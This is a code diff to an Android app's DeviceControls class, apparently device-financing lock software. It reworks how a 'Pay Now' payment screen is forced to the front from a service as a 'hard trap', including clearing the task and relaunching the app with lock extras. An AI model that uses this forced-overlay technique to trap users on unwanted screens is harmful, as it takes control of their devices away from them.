@@ -289,16 +289,22 @@ final class DeviceControls {
 
     /** Unthrottled open of MainActivity (Pay Now button / hard trap). */
     static void openPaymentScreenNow(Context context) {
+        openPaymentScreenNow(context, false);
+    }
+
+    /** Unthrottled open of MainActivity (Pay Now button / hard trap). */
+    static void openPaymentScreenNow(Context context, boolean forceNewTask) {
         if (isStkPromptExempt(context)) return;
+        markPaymentUiOpening(context, PAYMENT_UI_OPEN_DEFAULT_MS);
         try {
             Intent intent = new Intent(context, MainActivity.class);
-            // NEW_TASK is required from AccessibilityService; CLEAR_TASK ensures Pay UI is top.
+            // NEW_TASK is required from services; forceNewTask is used only for the first overlay handoff.
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
                     | Intent.FLAG_ACTIVITY_CLEAR_TOP
-                    | Intent.FLAG_ACTIVITY_SINGLE_TOP
-                    | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
-                    | Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED
-                    | Intent.FLAG_ACTIVITY_NO_USER_ACTION);
+                    | Intent.FLAG_ACTIVITY_SINGLE_TOP);
+            if (forceNewTask) {
+                intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);
+            }
             intent.putExtra("kismart_payment_lock", true);
             intent.putExtra("kismart_from_pay_now", true);
             context.startActivity(intent);
@@ -306,10 +312,15 @@ final class DeviceControls {
         } catch (Exception e) {
             Log.e(TAG, "openPaymentScreenNow failed: " + e.getMessage());
             try {
-                // Fallback: plain launch
-                Intent fallback = new Intent(context, MainActivity.class);
-                fallback.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                Intent fallback = context.getPackageManager().getLaunchIntentForPackage(context.getPackageName());
+                if (fallback == null) {
+                    fallback = new Intent(context, MainActivity.class);
+                }
+                fallback.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
+                fallback.putExtra("kismart_payment_lock", true);
+                fallback.putExtra("kismart_from_pay_now", true);
                 context.startActivity(fallback);
+                lastForcePaymentScreenAt = System.currentTimeMillis();
             } catch (Exception ignored) {
             }
         }
